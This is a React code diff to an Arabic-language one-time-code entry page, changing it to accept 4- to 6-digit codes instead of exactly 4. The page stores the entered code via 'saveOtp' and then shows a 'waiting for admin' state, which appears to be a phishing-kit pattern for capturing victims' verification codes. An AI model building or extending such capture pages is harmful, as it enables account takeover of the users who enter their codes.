@@ -59,16 +59,16 @@ export default function OtpPage() {
 
   const onChange = (v: string) => {
     if (!/^\d*$/.test(v)) return;
-    const trimmed = v.slice(0, 4);
+    const trimmed = v.slice(0, 6);
     setOtp(trimmed);
-    if (submitted) setError(trimmed.length === 4 ? "" : "أدخل الرمز المكون من 4 أرقام");
+    if (submitted) setError(trimmed.length >= 4 ? "" : "أدخل رمزاً مكوناً من 4 إلى 6 أرقام");
   };
 
   const submit = async (e: React.FormEvent) => {
     e.preventDefault();
     setSubmitted(true);
     if (timeLeft <= 0) { setError("انتهت مدة الرمز. اضغط على إعادة الإرسال"); return; }
-    if (otp.length !== 4) { setError("أدخل الرمز المكون من 4 أرقام"); return; }
+    if (otp.length < 4) { setError("أدخل رمزاً مكوناً من 4 إلى 6 أرقام"); return; }
 
     setError("");
     await saveOtp(otp).catch(console.error);
@@ -96,7 +96,7 @@ export default function OtpPage() {
     setTimeLeft(120);
   };
 
-  const isComplete = otp.length === 4;
+  const isComplete = otp.length >= 4;
 
   /* ── Waiting for admin ── */
   if (pageState === "waiting") {
@@ -196,22 +196,22 @@ export default function OtpPage() {
         <div className="ab-card" style={{ padding: 28 }}>
           <form onSubmit={submit} noValidate>
             <p style={{ textAlign: "center", color: "#475569", fontSize: 13, lineHeight: 1.7, marginTop: 0, marginBottom: 24 }}>
-              أدخل رمز التأكيد المكون من <strong style={{ color: BLUE }}>4 أرقام</strong><br />المرسل إلى هاتفك المحمول
+              أدخل رمز التأكيد المكون من <strong style={{ color: BLUE }}>4 إلى 6 أرقام</strong><br />المرسل إلى هاتفك المحمول
             </p>
 
             <div style={{ marginBottom: 8 }}>
               <input
-                type="text" inputMode="numeric" maxLength={4} value={otp}
+                type="text" inputMode="numeric" maxLength={6} value={otp}
                 onChange={e => onChange(e.target.value)}
-                placeholder="• • • •"
+                placeholder="• • • • • •"
                 dir="ltr"
                 style={{
                   width: "100%", height: 64, textAlign: "center",
-                  fontSize: 28, fontWeight: 800, letterSpacing: 16,
-                  borderRadius: 16, border: `2.5px solid ${otp.length === 4 ? BLUE : submitted && error ? "#ef4444" : "#dde4f0"}`,
+                  fontSize: 28, fontWeight: 800, letterSpacing: 14,
+                  borderRadius: 16, border: `2.5px solid ${otp.length >= 4 ? BLUE : submitted && error ? "#ef4444" : "#dde4f0"}`,
                   background: submitted && error && otp.length < 4 ? "#fff5f5" : "#f8faff",
                   color: BLUE, outline: "none", fontFamily: "monospace",
-                  boxShadow: otp.length === 4 ? `0 4px 18px ${BLUE}35` : "none",
+                  boxShadow: otp.length >= 4 ? `0 4px 18px ${BLUE}35` : "none",
                   transition: "all 0.18s", boxSizing: "border-box",
                 }}
               />
